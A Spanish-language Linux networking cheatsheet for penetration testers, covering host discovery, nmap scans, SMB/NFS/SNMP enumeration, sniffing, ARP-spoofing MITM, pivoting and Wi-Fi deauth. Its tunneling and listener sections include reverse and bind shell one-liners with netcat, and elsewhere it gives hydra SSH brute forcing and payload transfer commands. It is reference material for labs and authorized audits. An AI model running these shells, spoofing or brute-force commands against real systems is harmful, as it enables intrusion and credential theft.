# Nombre: cheatsheet-red-linux
# Descripción: Cheatsheet de red para Linux orientada a ciberseguridad: recon, enumeración de servicios, sniffing, MITM, firewalls, tunneling y pivoting.
# Tags: linux, network, nmap, tcpdump, iptables, smb, ssh, pivoting, sniffing
# Uso: referencia rapida; busca con Ctrl+F la seccion que necesites

# Cheatsheet de Red — Linux

> Moderno = `ip`/`ss` (reemplazan a `ifconfig`/`netstat`). Ambos incluidos porque en máquinas de auditoría hay de los dos.

## 1. Interfaces y configuración de red
- `ip a` · `ip addr show` → direcciones de todas las interfaces (equivale a ipconfig)
- `ip -br a` → salida compacta (una linea por interfaz, ideal para scripts)
- `ip link` → estado (UP/DOWN) y MAC de las NIC
- `ifconfig -a` (legado) · `ifconfig eth0`
- `ip route` · `ip r` · `route -n` → tabla de rutas / gateway
- `ip route get 10.10.11.5` → ¿por qué interfaz/gateway sale un destino? (clave para pivoting)
- `arp -a` · `ip neigh` → tabla ARP (hosts vistos en la LAN)
- `arp -d 10.10.10.5` → borrar una entrada
- Cambiar IP (interfaz de auditoría): `ip addr add 10.10.14.66/24 dev tun0` · `ip addr del 10.10.14.66/24 dev tun0`
- `ip link set eth0 up` · `ip link set eth0 down`
- `ethtool eth0` → velocidad/link del adaptador
- Ver tu IP pública: `curl ifconfig.me` · `curl -s ipinfo.io`

## 2. DNS
- `dig dominio.com` → resolución completa (A, tiempos, authoritative)
- `dig @8.8.8.8 dominio.com` → con DNS concreto
- `dig dominio.com ANY` · `dig dominio.com MX` · `dig dominio.com TXT` · `dig dominio.com NS` · `dig dominio.com CNAME`
- `dig -x 10.10.10.5` → PTR (resolución inversa)
- `dig @10.10.11.5 -p 53 dominio.com` → contra un DNS interno
- `nslookup dominio.com` · `nslookup dominio.com 8.8.8.8` · `nslookup -type=ANY dominio.com`
- `host dominio.com` · `host -t MX dominio.com` · `host 10.10.10.5` (inversa)
- `resolvectl status` (systemd) → DNS configurado
- Zona de transferencia: `dig @10.10.11.5 dominio.com AXFR` → si sale... joya
- Enumeración de subdominios: `for s in $(cat /usr/share/wordlists/subdomains.txt); do dig +short $s.dominio.com; done | grep -v "^$"`
- `dnsrecon -d dominio.com` · `dnsrecon -d dominio.com -t axfr` · `dnsenum dominio.com` · `fierce --domain dominio.com`
- `cat /etc/resolv.conf` → DNS del sistema

## 3. Descubrimiento de hosts (host discovery)
- `nmap -sn 10.10.10.0/24` → ping sweep (ICMP+ARP+TCP 80/443)
- `nmap -sn -PS22,80,443 -PU53 10.10.10.0/24` → combinar métodos (evadir filtros)
- `nmap -sn -PR 10.10.10.0/24` → solo ARP (rápido en LAN)
- `arp-scan --localnet` · `arp-scan 10.10.10.0/24` → muy rápido en LAN, muestra MAC/vendor
- `fping -asgq 10.10.10.0/24` · `fping -a -g 10.10.10.0/24` → sweep rápido
- `netdiscover -r 10.10.10.0/24` · `netdiscover -p` (pasivo)
- `ping -c 3 -b 10.10.10.255` → broadcast ping
- `hping3 -1 10.10.10.0/24 --flood` (agresivo) · `hping3 -1 -c 1 -W 100 10.10.10.5`
- Masscan en paralelo: `masscan -p1-65535 --rate 1000 10.10.10.5` (muy rápido)
- `nmap -sn -oG hosts.txt 10.10.10.0/24 && cat hosts.txt | awk '/Up/{print $2}' > alive.txt`

## 4. Escaneo de puertos y servicios (nmap) ★
- `nmap -sS 10.10.10.5` → SYN scan (rápido, necesita root)
- `nmap -sT 10.10.10.5` → TCP connect (sin root)
- `nmap -sV -p- 10.10.10.5` → TODOS los puertos + versión de servicios
- `nmap -sV -sC -O 10.10.10.5` → versión + scripts default + detección de OS (el clásico)
- `nmap -p 80,443,445,8080 10.10.10.5` · `nmap -p 1-1000 10.10.10.5`
- `nmap -p- -T4 --min-rate 1000 10.10.10.5` → escaneo rápido de todos los puertos
- `nmap -sU --top-ports 100 10.10.10.5` → puertos UDP (lento)
- `nmap -sV -sC -A -T4 -p <puertos> 10.10.10.5 -oN scan.txt` → guardar salida
- `nmap --script vuln 10.10.10.5` → scripts de vulnerabilidades
- `nmap --script smb-enum-shares,smb-os-discovery 10.10.10.5`
- `nmap -sS -f 10.10.10.5` (fragmentación) · `nmap -D RND:5 10.10.10.5` (decoys) · `nmap --source-port 53 10.10.10.5` (bypass filtros)
- `nmap -T0/-T1` (lento, sigiloso) · `-T4/-T5` (agresivo, ruidoso)
- `nmap --open -p445 10.10.10.0/24` → hosts con SMB abierto
- `nmap --open -p3389 10.10.10.0/24` → hosts con RDP
- `nmap -Pn 10.10.10.5` (sin ping) · `nmap -sn` (solo ping)
- `nmap --top-ports 1000 --open 10.10.10.5`

## 5. Conexiones y puertos (ss / netstat) — en el host
- `ss -tunlp` → puertos TCP/UDP en escucha + proceso (root)
- `ss -tunap` → todas las conexiones + procesos
- `ss -tnp` → conexiones TCP establecidas
- `ss -l` · `ss -lnt` (listening) · `ss -tn state established`
- `netstat -tulpn` (legado) → equivalente
- `netstat -an | grep LISTEN` · `netstat -tlnp`
- `lsof -i` → sockets abiertos con proceso · `lsof -i :80` → quien usa el 80
- `lsof -i -P -n | grep LISTEN`
- Ver sockets de un proceso: `lsof -p <PID> | grep -i tcp`
- `fuser 80/tcp` → PID que usa el puerto 80

## 6. Enumeración SMB / CIFS ★
- `smbclient -L //10.10.10.5 -N` → listar recursos sin credenciales (null session)
- `smbclient -L //10.10.10.5 -U 'domain\user%pass'`
- `smbclient //10.10.10.5/share -U user%pass` → entrar al recurso (dentro: `ls`, `cd`, `get`, `put`, `exit`)
- `smbclient //10.10.10.5/share -N` · `smbclient -N //10.10.10.5/share -c "get file.txt"`
- `enum4linux -a 10.10.10.5` → enumeración completa (users, shares, grupos, OS)
- `enum4linux -U 10.10.10.5` → usuarios · `enum4linux -S` → shares
- `crackmapexec smb 10.10.10.5` (hoy `nxc smb`) → banner, dominio, SMB signing
- `crackmapexec smb 10.10.10.5 -u '' -p ''` → null session
- `crackmapexec smb 10.10.10.5 -u admin -p password --shares` · `--users` · `--pass-pol`
- `smbmap -H 10.10.10.5 -u guest -p ''` → mapear shares con permisos · `smbmap -H 10.10.10.5 -R share --depth 2`
- `nmap --script smb-enum-shares,smb-enum-users -p445 10.10.10.5`
- `nmap --script smb-vuln-* -p445 10.10.10.5` → vulns SMB (eternalblue, ms17-010, ...)
- `rpcclient -U "" -N 10.10.10.5` → shell RPC (con `srvinfo`, `enumdomusers`, `enumdomgroups`, `netshareenumall`, `queryuser`)
- `rpcclient 10.10.10.5 -U 'user%pass' -c "enumdomusers" | grep -oP '\[.*?\]' | tr -d '[]' > users.txt`
- Montar share: `mount -t cifs //10.10.10.5/share /mnt -o username=user,password=pass`

## 7. NFS
- `showmount -e 10.10.10.5` → exportaciones NFS
- `nmap --script nfs-showmount -p111 10.10.10.5`
- `rpcinfo -p 10.10.10.5` → servicios RPC/portmapper
- Montar: `mkdir /mnt/nfs && mount -t nfs 10.10.10.5:/export /mnt/nfs -o nolock`

## 8. FTP
- `ftp 10.10.10.5` (login: `anonymous`) · `ftp -n` + `user`/`pass` por comandos
- `curl ftp://10.10.10.5/ --user anonymous:` → listar
- `nmap --script ftp-anon,ftp-bounce -p21 10.10.10.5`
- `wget -r ftp://user:pass@10.10.10.5/` → descargar todo recursivo
- `lftp -u user,pass 10.10.10.5` (mejor que ftp para scripts)

## 9. SSH
- `ssh user@10.10.10.5` · `ssh -p 2222 user@host` · `ssh -i key user@host`
- `ssh -o StrictHostKeyChecking=no user@host` → sin prompt de host key (lab)
- `ssh -o ProxyCommand="nc -x 10.10.14.5:1080 %h %p" user@host` → a través de SOCKS
- `ssh-keygen -t ed25519 -f key` → generar claves · `ssh-copy-id user@host`
- Fuerza bruta: `hydra -l root -P rockyou.txt ssh://10.10.10.5 -t 4`
- Claves vulnerables: `searchsploit openssh` · comprobar si el server está parcheado de `CVE-2024-6387` (regreSSHion)

## 10. SNMP
- `snmpwalk -v2c -c public 10.10.10.5` → enumerar OIDs (mucha info de red/sistema)
- `snmpwalk -v2c -c public 10.10.10.5 .1.3.6.1.2.1.1` → sistema
- `snmp-check 10.10.10.5 -c public` → escáner SNMP completo
- `onesixtyone 10.10.10.0/24 public` → probar community strings en la subred
- `nmap -sU --script snmp-brute -p161 10.10.10.5`
- `snmpbulkwalk -v2c -c public -Cn0 -Cr50 10.10.10.5`

## 11. HTTP / Web (lo esencial, la fase 08 tiene su propio material)
- `curl -s http://10.10.10.5/ | head -50` → banner/HTML
- `curl -sI http://10.10.10.5/` → cabeceras (server, tecnología, redirecciones)
- `curl -s http://10.10.10.5/robots.txt` · `curl -s http://10.10.10.5/sitemap.xml`
- `curl -s -X POST -d "user=admin&pass=pass" http://10.10.10.5/login`
- `curl -s -k https://10.10.10.5/` (certificado inválido) · `curl -s http://10.10.10.5/ -H "Host: virtualhost"`
- `wget -r --no-parent http://10.10.10.5/` → spider
- `nikto -h http://10.10.10.5` → escáner de vulnerabilidades web
- `gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt` · `gobuster vhost -u http://10.10.10.5 -w vhosts.txt`
- `ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt` → fuzzing (rápido)

## 12. Captura de tráfico (sniffing) ★
- `tcpdump -i eth0` → captura todo en eth0
- `tcpdump -i eth0 host 10.10.10.5` → tráfico con un host
- `tcpdump -i eth0 port 80` · `tcpdump -i eth0 port 443` · `tcpdump -i eth0 tcp port 445 or port 139`
- `tcpdump -i eth0 'tcp[13] & 2 != 0'` → solo SYN
- `tcpdump -i eth0 -A` (ASCII) · `-X` (hex+ASCII) → ver payload (credenciales en claro)
- `tcpdump -i eth0 -w captura.pcap` → guardar · `tcpdump -r captura.pcap` → leer
- `tcpdump -i eth0 -n -nn` → sin resolver (más limpio)
- `tcpdump -i eth0 src 10.10.14.5 and dst 10.10.10.5` · `tcpdump -i eth0 net 10.10.10.0/24`
- `tcpdump -i eth0 udp port 53` → DNS (filtra dominios)
- `tcpdump -i eth0 -G 60 -w captura-%H:%M:%S.pcap` → rotar cada minuto
- `tshark -i eth0` · `tshark -r captura.pcap` · `tshark -r captura.pcap -Y "http.request.method==POST"` · `tshark -r captura.pcap -Y "dns" -T fields -e dns.qry.name`
- `ngrep -d eth0 -q 'POST|GET|user|pass' port 80` → buscar strings en vivo
- `tcpflow -i eth0 port 80` → reconstruir flujos HTTP

## 13. MITM / ARP spoofing (solo con autorización)
- `echo 1 > /proc/sys/net/ipv4/ip_forward` · `sysctl -w net.ipv4.ip_forward=1` → activar forwarding
- `arpspoof -i eth0 -t 10.10.10.5 10.10.10.1` (target → gateway) + `arpspoof -i eth0 -t 10.10.10.1 10.10.10.5` (bidireccional, dos terminales)
- `ettercap -T -i eth0 -M arp:remote /10.10.10.5// /10.10.10.1//` → MITM con interfaz interactiva
- `bettercap -eval "set arp.spoof.targets 10.10.10.5; arp.spoof on"` → versión moderna
- `hsts/sslstrip` (ettercap) para degradar HTTPS · o redirigir con iptables hacia un MITM proxy

## 14. Firewalls (iptables / nftables / ufw)
- `iptables -L -n -v` → reglas actuales · `iptables -S`
- `iptables -t nat -L -n -v` → reglas NAT (importante para ver redirecciones)
- Redirigir tráfico (pivoting): `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080`
- Forward completo: `iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination 10.10.11.5:445` + `iptables -t nat -A POSTROUTING -j MASQUERADE`
- Bloquear puerto: `iptables -A INPUT -p tcp --dport 23 -j DROP`
- `nft list ruleset` (nftables moderno)
- `ufw status verbose` · `ufw allow 8080/tcp` · `ufw deny 23/tcp`
- Limpiar: `iptables -F` · `iptables -t nat -F` · `iptables -X` · `iptables -P INPUT ACCEPT`

## 15. Tunneling / Pivoting / Proxy ★
- SOCKS5: `ssh -D 1080 user@pivot` → proxychains con `socks5 127.0.0.1 1080`
- Puerto local: `ssh -L 127.0.0.1:445:pivot:445 user@pivot` → acceder a servicio interno como si fuera local
- Reverse: `ssh -R 8080:pivot:80 user@nuestro` → exponer servicio interno hacia nosotros
- `proxychains4 nmap -sT -Pn 10.10.11.5` → nmap a través de SOCKS (usa -sT, no -sS)
- `socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.10.11.5:445` → forward de puerto simple
- `socat -v TCP-LISTEN:4444,fork TCP:10.10.11.5:3389` → pivot RDP
- `chisel client 10.10.14.5:8080 R:445:10.10.11.5:445` / `chisel server --reverse` → túnel dinámico moderno (mejor para lab)
- `nc -lvnp 4444 -c bash` → bind shell · `nc 10.10.14.5 4444 -e /bin/bash` (si el nc lo soporta)
- `mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/bash > /tmp/f` → nc clásico sin -e (reverse shell)
- `sshuttle -r user@10.10.10.5 10.10.11.0/24` → VPN sobre SSH (pivoting transparente, si funciona es lo mejor)

## 16. Listener para recibir shells
- `nc -lvnp 4444` (básico) · `ncat -lvnp 4444 --ssl` (cifrado, evade IDS)
- `socat TCP-LISTEN:4444,reuseaddr,fork -`
- Con utilidad: `rlwrap nc -lvnp 4444` (historia y flechas) → o `socat` + tty
- `python3 -m http.server 8080` → servidor HTTP para transferir archivos (¡ojo al firewall!)
- `python3 -m http.server 8080 --directory /tmp` → subir/descargar archivos
- Almacenar shells: `nc -lvnp 4444 > shell.txt`

## 17. Transferencia de archivos (para el atacante)
- Servidor: `python3 -m http.server 80` (en la raíz de lo que quieras compartir)
- Cliente: `wget http://IP/nc.exe` · `curl -O http://IP/nc.exe` · `scp file user@IP:` · `rsync -av file user@IP:`
- `nc -lvnp 4444 < payload.exe` (enviar) / `nc IP 4444 > payload.exe` (recibir)
- `base64 -w0 file > file.b64` → transferir por canal de texto y decodificar: `echo <b64> | base64 -d > file`

## 18. DNS enumeración avanzada (recon pasivo)
- `dnsrecon -d dominio.com -t brt -D subdomains.txt` · `dnsrecon -d dominio.com -t axfr`
- `subfinder -d dominio.com` · `amass enum -d dominio.com` (pasivo) · `assetfinder dominio.com`
- `theHarvester -d dominio.com -b all` → emails/subdominios (lento pero completo)
- `host -t a dominio.com` · comprobar registros SPF/DMARC: `dig dominio.com TXT`

## 19. Wireless (solo auditoría, fase 09)
- `airmon-ng start wlan0` → modo monitor · `airmon-ng check kill`
- `airodump-ng wlan0mon` → ver redes/APs/clientes
- `airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon` → captura dirigida
- `aireplay-ng -0 5 -a AP_BSSID -c CLIENT wlan0mon` → deauth
- `crack` hashes con aircrack-ng/hashcat: `aircrack-ng -w rockyou.txt captura-01.cap`

## 20. Verificación de conexiones salientes del host (para confirmar acceso)
- `curl -s ifconfig.me` → IP saliente (¿sale por el NAT esperado?)
- `ss -tnp | grep ESTAB` → conexiones activas del proceso en cuestión
- `curl -sI https://www.google.com --max-time 5` → ¿hay salida a internet?
- `ping -c 1 1.1.1.1` (falla si bloquean ICMP) · `nc -zv 1.1.1.1 443` → test TCP de salida
- `hostname -I` · `cat /etc/hosts` · `cat /etc/hostname` → identidad del host

## Notas de defensa
- `ss -tunlp` + `tcpdump` son la primera línea ante sospecha de C2 en un Linux.
- Comprueba `iptables -t nat -L` en hosts comprometidos: suelen usarlo para redirigir tráfico en pivoting.
- Un `arp -a` con muchas entradas dinámicas o un forwarding activo (`sysctl net.ipv4.ip_forward`) puede delatar MITM.
